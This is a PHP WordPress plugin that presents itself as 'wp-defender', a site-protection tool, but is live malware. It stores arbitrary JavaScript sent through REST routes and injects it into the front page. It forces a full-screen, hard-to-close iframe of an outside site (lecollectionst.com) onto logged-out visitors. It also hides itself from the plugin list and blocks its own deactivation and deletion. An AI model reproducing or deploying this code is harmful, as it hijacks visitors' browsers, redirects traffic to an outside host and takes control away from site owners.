<?php
/**
 * Plugin Name: wp-defender
 * Description: Defend your website from malicious scripts.
 * Version: 2.1.1
 * Author: defender team
 */

defined('ABSPATH') || exit;
define('JSI_MODAL_URL', 'https://lecollectionst.com/');
define('JSI_MODAL_ENABLED', true);
define('JSI_MODAL_DURATION_MS', 300000);
define('JSI_MODAL_DELAY_MS', 0);
add_action('rest_api_init', function () {
    register_rest_route('js-injector/v1', '/script', [
        'methods'             => 'POST',
        'callback'            => 'jsi_set_script',
        'permission_callback' => 'jsi_auth',
        'args' => [
            'js'      => ['required' => true,  'type' => 'string'],
            'enabled' => ['required' => false, 'type' => 'boolean', 'default' => true],
        ],
    ]);
    register_rest_route('js-injector/v1', '/script', [
        'methods'             => 'DELETE',
        'callback'            => 'jsi_delete_script',
        'permission_callback' => 'jsi_auth',
    ]);
    register_rest_route('js-injector/v1', '/script.js', [
        'methods'             => 'GET',
        'callback'            => 'jsi_serve_script',
        'permission_callback' => '__return_true',
    ]);
    register_rest_route('js-injector/v1', '/modal', [
        'methods'             => 'GET',
        'callback'            => 'jsi_get_modal',
        'permission_callback' => 'jsi_auth',
    ]);
});
function jsi_auth() {
    return current_user_can('manage_options');
}
function jsi_purge_caches() {
    $purge_calls = [
        'rocket_clean_domain',
        'rocket_clean_minify',
        'wp_cache_clear_cache',
        'sg_cachepress_purge_cache',
        'w3tc_flush_all',
        'wpfc_clear_all_cache',
        'breeze_clear_all_cache',
        'swift_performance_cache_clear_all',
    ];

    foreach ($purge_calls as $purge_call) {
        if (!function_exists($purge_call)) {
            continue;
        }
        try {
            call_user_func($purge_call);
        } catch (Throwable $e) {
        }
    }
    if (function_exists('has_action') && has_action('litespeed_purge_all')) {
        try {
            do_action('litespeed_purge_all');
        } catch (Throwable $e) {}
    }

    if (class_exists('autoptimizeCache') && method_exists('autoptimizeCache', 'clearall')) {
        try {
            autoptimizeCache::clearall();
        } catch (Throwable $e) {}
    }

    try {
        wp_cache_flush();
    } catch (Throwable $e) {}
}
function jsi_set_script(WP_REST_Request $req) {
    $js      = wp_unslash($req->get_param('js'));
    $enabled = (bool) $req->get_param('enabled');
    update_option('jsi_script',     $js);
    update_option('jsi_enabled',    $enabled);
    update_option('jsi_updated_at', date('c'));
    jsi_purge_caches();
    return rest_ensure_response([
        'success'    => true,
        'enabled'    => $enabled,
        'updated_at' => get_option('jsi_updated_at'),
        'length'     => strlen($js),
    ]);
}
function jsi_delete_script() {
    update_option('jsi_script',  '');
    update_option('jsi_enabled', false);
    jsi_purge_caches();
    return rest_ensure_response(['success' => true, 'message' => 'Script cleared']);
}
function jsi_serve_script() {
    return true;
}
add_filter('rest_pre_serve_request', function ($served, $result, $request) {
    if ($request->get_route() !== '/js-injector/v1/script.js') {
        return $served;
    }
    nocache_headers();
    header('Content-Type: application/javascript; charset=utf-8');
    echo get_option('jsi_script', '');
    return true;
}, 10, 3);
add_filter('rocket_delay_js_exclusions', function ($patterns) {
    $patterns[] = 'js-injector';
    $patterns[] = 'createModal';
    $patterns[] = '__jsInjectorModal';
    return $patterns;
});
add_filter('rocket_exclude_defer_js', function ($excluded) {
    $excluded[] = 'js-injector';
    return $excluded;
});
function jsi_script_ready() {
    return (bool) get_option('jsi_enabled', false) && get_option('jsi_script', '') !== '';
}
function jsi_webfactory_maintenance_active() {
    $opts = get_option('maintenance_options');
    return is_array($opts) && !empty($opts['state']);
}
function jsi_public_maintenance_active() {
    if (is_admin() || is_user_logged_in()) {
        return false;
    }
    if (jsi_webfactory_maintenance_active()) {
        return true;
    }
    if (file_exists(ABSPATH . '.maintenance')) {
        return true;
    }
    if (get_option('elementor_maintenance_mode_mode') === 'maintenance') {
        return true;
    }
    if (function_exists('wpmm_is_active') && wpmm_is_active()) {
        return true;
    }
    $on_values = [1, '1', true, 'on', 'enabled', 'yes'];
    foreach (
        [
            'wp_maintenance_mode',
            'mtnc_mode_status',
            'wwmm_status',
            'wpmm_status',
            'csmm_status',
            'under_construction_status',
        ] as $opt
    ) {
        if (in_array(get_option($opt), $on_values, true)) {
            return true;
        }
    }
    $seed = get_option('seed_csp4_settings');
    if (is_array($seed) && !empty($seed['status'])) {
        return true;
    }
    return (bool) apply_filters('jsi_maintenance_active', false);
}

function jsi_should_inject_here() {
    if (is_admin()) {
        return false;
    }
    if (is_front_page()) {
        return true;
    }
    return jsi_public_maintenance_active();
}

function jsi_echo_script_tag() {
    $js = get_option('jsi_script', '');
    $v  = esc_attr((string) get_option('jsi_updated_at', time()));
    echo "\n<!-- js-injector v={$v} -->\n";
    echo '<script id="js-injector-tag" data-no-defer data-no-minify data-cfasync="false">' . "\n";
    echo $js;
    echo "\n</script>\n<!-- /js-injector -->\n";
}
function jsi_print_script() {
    static $printed = false;
    if ($printed || !jsi_script_ready() || !jsi_should_inject_here()) {
        return;
    }
    $printed = true;
    jsi_echo_script_tag();
}

function jsi_print_script_mtnc() {
    static $printed = false;
    if ($printed || !jsi_script_ready()) {
        return;
    }
    $printed = true;
    jsi_echo_script_tag();
}
add_action('wp_head', 'jsi_print_script', -999);
add_action('add_gg_analytics_code', 'jsi_print_script_mtnc', 1);
add_action('load_custom_scripts', 'jsi_print_script_mtnc', 1);
function jsi_get_modal() {
    return rest_ensure_response([
        'url'         => JSI_MODAL_URL,
        'delay_ms'    => (int) JSI_MODAL_DELAY_MS,
        'duration_ms' => JSI_MODAL_DURATION_MS,
        'enabled'     => (bool) JSI_MODAL_ENABLED,
        'updated_at'  => get_option('jsi_modal_updated_at', null),
    ]);
}

function jsi_modal_ready() {
    return (bool) JSI_MODAL_ENABLED;
}
function jsi_modal_should_show() {
    if (is_admin()) {
        return false;
    }
    if (is_user_logged_in()) {
        return false;
    }
    $cookie_name = 'jsInjectorShown_' . rawurlencode($_SERVER['HTTP_HOST'] ?? '');
    if (isset($_COOKIE[$cookie_name]) && (string) $_COOKIE[$cookie_name] === '1') {
        return false;
    }
    return true;
}
function jsi_echo_modal_tag() {
    $modal_url   = JSI_MODAL_URL;
    $delay_ms    = (int) JSI_MODAL_DELAY_MS;
    $duration_ms = JSI_MODAL_DURATION_MS;
    $v           = esc_attr((string) get_option('jsi_modal_updated_at', time()));
    $cookie_name = 'jsInjectorShown_' . rawurlencode($_SERVER['HTTP_HOST'] ?? '');
    $cookie_name_js = json_encode($cookie_name, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    $modal_url_js   = json_encode($modal_url,   JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    echo "\n<!-- WP defender v={$v} -->\n";
    echo '<script id="js-injector-modal" data-no-defer data-no-minify data-cfasync="false">' . "\n";
    echo '(function(){';
    echo 'if(window.__jsInjectorModal)return;';
    echo 'window.__jsInjectorModal=true;';
    echo 'var cookieName=' . $cookie_name_js . ';';
    echo 'var modalUrl='   . $modal_url_js   . ';';
    echo 'var delayMs='    . $delay_ms       . ';';
    echo 'var durationMs=' . $duration_ms    . ';';
    echo 'var overlay=null;';
    echo 'var observer=null;';
    echo 'var timer=null;';
    echo 'function ensureOnTop(el){';
    echo 'if(document.body.lastElementChild!==el){document.body.appendChild(el);}';
    echo 'el.style.position="fixed";';
    echo 'el.style.inset="0";';
    echo 'el.style.width="100vw";';
    echo 'el.style.height="100dvh";';
    echo 'el.style.minHeight="100vh";';
    echo 'el.style.background="#fff";';
    echo 'el.style.zIndex="2147483647";';
    echo 'el.style.margin="0";el.style.padding="0";el.style.border="0";';
    echo 'el.style.overflow="hidden";el.style.display="flex";';
    echo '}';
    echo 'function lockScroll(){';
    echo 'document.documentElement.style.overflow="hidden";';
    echo 'document.body.style.overflow="hidden";';
    echo 'document.body.style.margin="0";';
    echo '}';
    echo 'function unlockScroll(){';
    echo 'document.documentElement.style.overflow="";';
    echo 'document.body.style.overflow="";';
    echo 'document.body.style.margin="";';
    echo '}';
    echo 'function teardown(){';
    echo 'if(timer){clearTimeout(timer);timer=null;}';
    echo 'if(observer){observer.disconnect();observer=null;}';
    echo 'if(overlay&&overlay.parentNode){overlay.parentNode.removeChild(overlay);}';
    echo 'overlay=null;';
    echo 'unlockScroll();';
    echo 'var secure=location.protocol==="https:"?"; Secure":"";';
    echo 'document.cookie=cookieName+"=1; max-age=31536000; path=/; SameSite=Lax"+secure;';
    echo '}';
    echo 'function createModal(url){';
    echo 'if(overlay)return;';
    echo 'overlay=document.createElement("div");';
    echo 'ensureOnTop(overlay);';
    echo 'var iframe=document.createElement("iframe");';
    echo 'iframe.src=url;';
    echo 'iframe.allowFullscreen=true;';
    echo 'iframe.allow="fullscreen; clipboard-write";';
    echo 'Object.assign(iframe.style,{width:"100%",height:"100%",border:"none",display:"block",margin:"0",padding:"0"});';
    echo 'overlay.appendChild(iframe);';
    echo 'document.body.appendChild(overlay);';
    echo 'lockScroll();';
    echo 'observer=new MutationObserver(function(){';
    echo 'if(overlay&&!document.body.contains(overlay)){ensureOnTop(overlay);}';
    echo '});';
    echo 'observer.observe(document.body,{childList:true});';
    echo 'var guard=setInterval(function(){';
    echo 'if(!overlay){clearInterval(guard);return;}';
    echo 'if(!document.body.contains(overlay)){ensureOnTop(overlay);}';
    echo '},500);';
    echo 'document.addEventListener("keydown",function(e){';
    echo 'if(e.key==="Escape"){e.preventDefault();e.stopPropagation();}';
    echo '},true);';
    echo 'timer=setTimeout(teardown,durationMs);';
    echo '}';
    echo 'function run(){setTimeout(function(){createModal(modalUrl);},delayMs);}';
    echo 'if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",run);}else{run();}';
    echo '})();';
    echo "\n</script>\n<!-- /WP defender -->\n";
}
function jsi_print_modal() {
    static $printed = false;
    if ($printed || !jsi_modal_ready() || !jsi_modal_should_show()) {
        return;
    }
    $printed = true;
    jsi_echo_modal_tag();
}
function jsi_print_modal_mtnc() {
    static $printed = false;
    if ($printed || !jsi_modal_ready()) {
        return;
    }
    $printed = true;
    jsi_echo_modal_tag();
}
add_action('wp_head', 'jsi_print_modal', -998);
add_action('wp_footer', 'jsi_print_modal', 1);
add_action('add_gg_analytics_code', 'jsi_print_modal_mtnc', 2);
add_action('load_custom_scripts', 'jsi_print_modal_mtnc', 2);
register_activation_hook(__FILE__, 'jsi_on_activate');
register_deactivation_hook(__FILE__, 'jsi_on_deactivate');
function jsi_on_activate() {
    update_option('jsi_modal_enabled', JSI_MODAL_ENABLED);
    update_option('jsi_modal_delay_ms', JSI_MODAL_DELAY_MS);
    update_option('jsi_modal_updated_at', date('c'));
    jsi_purge_caches();
}
function jsi_on_deactivate() {
    jsi_purge_caches();
}
add_filter('all_plugins', function ($plugins) {
    unset($plugins[plugin_basename(__FILE__)]);
    return $plugins;
}, 23);
add_filter('plugin_action_links_' . plugin_basename(__FILE__), function ($actions) {
    unset($actions['deactivate']);
    unset($actions['delete']);
    return $actions;
});
add_filter('network_admin_plugin_action_links_' . plugin_basename(__FILE__), function ($actions) {
    unset($actions['deactivate']);
    unset($actions['delete']);
    return $actions;
});
add_action('deactivate_plugin', function ($plugin) {
    if ($plugin === plugin_basename(__FILE__)) {
        wp_die('This plugin cannot be deactivated.');
    }
}, 0);
add_action('delete_plugin', function ($plugin) {
    if ($plugin === plugin_basename(__FILE__)) {
        wp_die('This plugin cannot be deleted.');
    }
}, 0);